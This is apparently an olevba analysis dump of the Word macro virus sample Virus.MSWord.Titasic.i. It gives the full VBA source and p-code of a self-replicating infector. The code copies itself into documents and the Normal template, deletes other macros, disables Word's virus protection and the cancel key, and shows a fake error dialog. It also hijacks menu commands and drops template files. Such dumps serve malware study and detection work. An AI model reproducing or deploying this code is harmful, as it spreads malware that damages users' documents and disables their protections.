olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO astia.bas 
in file: Virus.MSWord.Titasic.i - OLE stream: 'Macros/VBA/astia'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AD As Object, aDes As Variant
Public NonTdkAsic As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function SasMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error Resume Next
nmak(0) = "astia"
nmak(1) = "TITASIC"
aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "NTemp.dot" Then
aSrc = NT
End If
If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "NTemp.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\NTemp.src"
End If

Mhapus aDes
With aDes.VBProject
If Not (Not hapus And .Description = "sas" And .VBComponents.Count > 2) Then
    Mcopy aSrc, aDes, nmak
    hapus = False
    .Description = "sas"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
End Function

Sub Mhapus(Sfile)
Dim nmak As Object, Dumy As Variant
For Each nmak In Sfile.VBProject.VBComponents
    Dumy = nmak.Name
    If nmak.Name = "NewMacros" Then NonTdkAsic = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "TdkAsic" And nmak.Name <> "astia" And nmak.Name <> "TITASIC" Then
        hapus = True
        If Not reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
    If (Dumy = "astia" Or Dumy = "TITASIC") And Not reset Then _
        Application.OrganizerDelete aDes, Dumy, 3
        
Next nmak
End Sub
Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
On Error Resume Next
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub Action()
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "TdkAsic"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "TdkAsic," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
    .Visible = True
    .PresetGradient Int((6 - 1 + 1) * Rnd + 1), 1, Int((24 - 1 + 1) * Rnd + 1)
End With
TdkAsic.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
WBT
ActiveDocument.Close 0
WBF
End Sub
Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub

Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
SasMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    SasMaster
    End If
    Next
End If
If Now > DateSerial(1999, 5, 23) Then Application.OnTime When:=Now + TimeValue("00:54:05"), Name:="sas.Action"
End
End Sub
Sub ViewVBCode()
If MsgBox("Error code 545, automacro disable" & Chr(13) & "Try to reinstall system" _
& Chr(13) & "Do you want to continue manually?" _
, vbExclamation + vbYesNo, "TdkAsic") = vbYes Then SendKeys "%m%s{down}~%d'Macro non-TdkAsic'%m"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
SasMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "NTemp.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
SasMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\NTemp.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\NTemp.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonTdkAsic Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".sas.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Bohong kalau dia bilang Titasic tidak bisa dihapus, Anda masih bisa menghapus makro buatan Anda (Descr: 'Makro non-TdkAsic')"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVBCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "Titasic" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "NTemp.dot" Then SasMaster
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Titasic.i
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1122 bytes
' Macros/VBA/astia - 12266 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' 	VarDefn aDes (As Variant)
' Line #1:
' 	Dim (Public) 
' 	VarDefn NonTdkAsic (As Boolean)
' 	VarDefn afound (As Boolean)
' 	VarDefn hapus (As Boolean)
' 	VarDefn reset (As Boolean)
' 	VarDefn aExc (As Boolean)
' 	VarDefn DocCount (As Boolean)
' Line #2:
' 	FuncDefn (Function SasMaster())
' Line #3:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn nmak (As String)
' Line #4:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #5:
' 	Dim 
' 	VarDefn aSrc
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	LitStr 0x0005 "astia"
' 	LitDI2 0x0000 
' 	ArgsSt nmak 0x0001 
' Line #8:
' 	LitStr 0x0007 "TITASIC"
' 	LitDI2 0x0001 
' 	ArgsSt nmak 0x0001 
' Line #9:
' 	Ld MacroContainer 
' 	St aSrc 
' Line #10:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #11:
' 	Ld DocCount 
' 	Not 
' 	IfBlock 
' Line #12:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #13:
' 	Ld aSrc 
' 	LitStr 0x0009 "NTemp.dot"
' 	Ne 
' 	ElseIfBlock 
' Line #14:
' 	Ld NT 
' 	St aSrc 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld aSrc 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #17:
' 	Ld NT 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld AD 
' 	Set aDes 
' Line #18:
' 	Ld aSrc 
' 	Ld AD 
' 	Eq 
' 	ElseIfBlock 
' Line #19:
' 	Ld AD 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #20:
' 	Ld aSrc 
' 	LitStr 0x0009 "NTemp.dot"
' 	Eq 
' 	ElseIfBlock 
' Line #21:
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #22:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\NTemp.src"
' 	Concat 
' 	St aSrc 
' Line #23:
' 	EndIfBlock 
' Line #24:
' Line #25:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #26:
' 	StartWithExpr 
' 	Ld aDes 
' 	MemLd VBProject 
' 	With 
' Line #27:
' 	Ld hapus 
' 	Not 
' 	MemLdWith Description 
' 	LitStr 0x0003 "sas"
' 	Eq 
' 	And 
' 	MemLdWith VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #28:
' 	Ld aSrc 
' 	Ld aDes 
' 	Ld nmak 
' 	ArgsCall Mcopy 0x0003 
' Line #29:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #30:
' 	LitStr 0x0003 "sas"
' 	MemStWith Description 
' Line #31:
' 	Ld aDes 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveInterval 
' Line #33:
' 	Ld NT 
' 	St CustomizationContext 
' Line #34:
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #35:
' 	LineCont 0x0004 10 00 08 00
' 	LitDI2 0x004D 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0001 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0015 "ToolsRecordMacroStart"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #36:
' 	Ld aDes 
' 	ArgsMemCall Save 0x0000 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	LitStr 0x000A "ViewVbCode"
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #39:
' 	ElseBlock 
' Line #40:
' 	GoTo Aksi 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	EndWith 
' Line #43:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #44:
' 	ArgsCall Refresh 0x0000 
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	Label Aksi 
' Line #47:
' 	Ld aExc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #48:
' 	ExitFunc 
' Line #49:
' 	EndFunc 
' Line #50:
' Line #51:
' 	FuncDefn (Sub Mhapus(Sfile))
' Line #52:
' 	Dim 
' 	VarDefn nmak (As Object)
' 	VarDefn Dumy (As Variant)
' Line #53:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	Ld Sfile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #54:
' 	Ld nmak 
' 	MemLd New 
' 	St Dumy 
' Line #55:
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NonTdkAsic 
' 	EndIf 
' Line #56:
' 	LineCont 0x0004 0C 00 04 00
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0007 "TdkAsic"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0005 "astia"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0007 "TITASIC"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #57:
' 	LitVarSpecial (True)
' 	St hapus 
' Line #58:
' 	Ld reset 
' 	Not 
' 	IfBlock 
' Line #59:
' 	Ld Sfile 
' 	MemLd FullName 
' 	Ld nmak 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #60:
' 	ElseBlock 
' Line #61:
' 	LitDI2 0x0001 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	LineCont 0x0004 0E 00 08 00
' 	Ld Dumy 
' 	LitStr 0x0005 "astia"
' 	Eq 
' 	Ld Dumy 
' 	LitStr 0x0007 "TITASIC"
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld reset 
' 	Not 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld aDes 
' 	Ld Dumy 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #65:
' Line #66:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub Mcopy(Sfile, Dfile, nmak))
' Line #69:
' 	Dim 
' 	VarDefn aNmak
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	StartForVariable 
' 	Ld aNmak 
' 	EndForVariable 
' 	Ld nmak 
' 	ForEach 
' Line #72:
' 	Ld Sfile 
' 	Ld Dfile 
' 	MemLd FullName 
' 	Ld aNmak 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #73:
' 	StartForVariable 
' 	Next 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub Action())
' Line #76:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #79:
' 	LitStr 0x0007 "TdkAsic"
' 	MemStWith Caption 
' Line #80:
' 	LitDI2 0x0064 
' 	MemLdWith ActivePane 
' 	MemLd View 
' 	MemLd Zoom 
' 	MemSt Percentage 
' Line #81:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #82:
' 	LitVarSpecial (False)
' 	MemStWith DisplayRulers 
' Line #83:
' 	LitVarSpecial (False)
' 	MemStWith DisplayHorizontalScrollBar 
' Line #84:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalRuler 
' Line #85:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalScrollBar 
' Line #86:
' 	LitVarSpecial (False)
' 	MemLdWith View 
' 	MemSt ShowTextBoundaries 
' Line #87:
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Position 
' Line #88:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	With 
' Line #89:
' 	LitStr 0x0008 "TdkAsic,"
' 	LitStr 0x0002 "  "
' 	Concat 
' 	Ld Date 
' 	Concat 
' 	MemStWith Caption 
' Line #90:
' 	LitDI2 0x0003 
' 	MemStWith Style 
' Line #91:
' 	LitDI2 0x0119 
' 	MemStWith FaceId 
' Line #92:
' 	EndWith 
' Line #93:
' 	LitDI2 0x0006 
' 	MemLdWith View 
' 	MemSt TypeOf 
' Line #94:
' 	ArgsCall Read 0x0000 
' Line #95:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	With 
' Line #96:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #97:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsMemCallWith PresetGradient 0x0003 
' Line #98:
' 	EndWith 
' Line #99:
' 	Ld TdkAsic 
' 	ArgsMemCall Show 0x0000 
' Line #100:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #101:
' 	EndWith 
' Line #102:
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #103:
' 	ArgsCall WBT 0x0000 
' Line #104:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #105:
' 	ArgsCall WBF 0x0000 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub FileOpen())
' Line #108:
' 	ArgsCall WBT 0x0000 
' Line #109:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #110:
' 	ArgsCall WBF 0x0000 
' Line #111:
' 	ArgsCall AutoOpen 0x0000 
' Line #112:
' 	ElseBlock 
' Line #113:
' 	ArgsCall WBF 0x0000 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' 	FuncDefn (Sub AutoOpen())
' Line #118:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #119:
' 	ArgsCall SasMaster 0x0000 
' Line #120:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #121:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #122:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #123:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set AD 
' Line #124:
' 	LitVarSpecial (True)
' 	St DocCount 
' Line #125:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #126:
' 	ArgsCall SasMaster 0x0000 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	StartForVariable 
' 	Next 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	Ld Now 
' 	LitDI2 0x07CF 
' 	LitDI2 0x0005 
' 	LitDI2 0x0017 
' 	ArgsLd DateSerial 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld Now 
' 	LitStr 0x0008 "00:54:05"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x000A "sas.Action"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' 	EndIf 
' Line #131:
' 	End 
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Sub ViewVBCode())
' Line #134:
' 	LineCont 0x0008 0B 00 00 00 12 00 00 00
' 	LitStr 0x0021 "Error code 545, automacro disable"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0017 "Try to reinstall system"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0021 "Do you want to continue manually?"
' 	Concat 
' 	Ld vbExclamation 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x0007 "TdkAsic"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0022 "%m%s{down}~%d'Macro non-TdkAsic'%m"
' 	ArgsCall SendKeys 0x0001 
' 	EndIf 
' Line #135:
' 	EndSub 
' Line #136:
' 	FuncDefn (Sub AutoExec())
' Line #137:
' 	OnError (Resume Next) 
' Line #138:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	IfBlock 
' Line #139:
' 	LitVarSpecial (True)
' 	St aExc 
' Line #140:
' 	ArgsCall SasMaster 0x0000 
' Line #141:
' 	ArgsCall WBT 0x0000 
' Line #142:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #143:
' 	ArgsCall WBF 0x0000 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub AutoExit())
' Line #148:
' 	Dim 
' 	VarDefn aAddin (As Object)
' Line #149:
' 	OnError batal 
' Line #150:
' 	ArgsCall WBT 0x0000 
' Line #151:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Documents 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #152:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #153:
' 	LitVarSpecial (True)
' 	St afound 
' Line #154:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	Ld AddIns 
' 	ForEach 
' Line #155:
' 	Ld aAddin 
' 	MemLd New 
' 	LitStr 0x0009 "NTemp.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St afound 
' 	EndIf 
' Line #156:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	NextVar 
' Line #157:
' Line #158:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #159:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #160:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #161:
' 	ArgsCall SasMaster 0x0000 
' Line #162:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #163:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\NTemp.src"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #164:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\NTemp.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #165:
' 	EndWith 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #168:
' 	Label batal 
' Line #169:
' 	ArgsCall WBF 0x0000 
' Line #170:
' 	EndSub 
' Line #171:
' 	FuncDefn (Sub ToolsMacro())
' Line #172:
' 	ArgsCall WBF 0x0000 
' Line #173:
' 	OnError batal 
' Line #174:
' 	Ld ActiveDocument 
' 	ArgsCall Mhapus 0x0001 
' Line #175:
' 	Ld NonTdkAsic 
' 	IfBlock 
' Line #176:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x000F ".sas.ToolsMacro"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' 	BoS 0x0000 
' 	ExitSub 
' 	EndIf 
' Line #177:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #178:
' 	StartWithExpr 
' 	LitDI2 0x00D7 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #179:
' 	LitStr 0x007C "Bohong kalau dia bilang Titasic tidak bisa dihapus, Anda masih bisa menghapus makro buatan Anda (Descr: 'Makro non-TdkAsic')"
' 	MemStWith Description 
' Line #180:
' 	MemLdWith Display 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsMemCallWith Execute 0x0000 
' 	EndIf 
' Line #181:
' 	EndWith 
' Line #182:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #183:
' 	ElseBlock 
' Line #184:
' 	ArgsCall ViewVBCode 0x0000 
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	Label batal 
' Line #187:
' 	EndSub 
' Line #188:
' 	FuncDefn (Sub FileTemplates())
' Line #189:
' 	ArgsCall WBF 0x0000 
' Line #190:
' 	Ld reset 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' 	EndIf 
' Line #191:
' 	EndSub 
' Line #192:
' 	FuncDefn (Sub FormatStyle())
' Line #193:
' 	ArgsCall WBF 0x0000 
' Line #194:
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #195:
' 	EndSub 
' Line #196:
' 	FuncDefn (Function Refresh())
' Line #197:
' 	LitVarSpecial (True)
' 	St reset 
' Line #198:
' 	ArgsCall FileTemplates 0x0000 
' Line #199:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #200:
' 	EndFunc 
' Line #201:
' 	FuncDefn (Sub AutoClose())
' Line #202:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #203:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #204:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #205:
' 	LitDI2 0x000A 
' 	MemStWith SaveInterval 
' Line #206:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #207:
' 	EndWith 
' Line #208:
' 	LineCont 0x0004 15 00 00 00
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0007 "Titasic"
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0006 "Docume"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0009 "NTemp.dot"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall SasMaster 0x0000 
' 	EndIf 
' Line #209:
' 	EndSub 
' Line #210:
' 	FuncDefn (Sub FileExit())
' Line #211:
' 	ArgsCall AutoExit 0x0000 
' Line #212:
' 	EndSub 
' Line #213:
' 	FuncDefn (Sub ToolsOptions())
' Line #214:
' 	LitStr 0x002B "C:\Program Files\Microsoft Office\Templates"
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #215:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #216:
' 	Ld Application 
' 	MemLd Path 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #217:
' 	EndSub 
' Line #218:
' 	FuncDefn (Function WBT())
' Line #219:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #220:
' 	EndFunc 
' Line #221:
' 	FuncDefn (Function WBF())
' Line #222:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #223:
' 	EndFunc 
' Line #224:
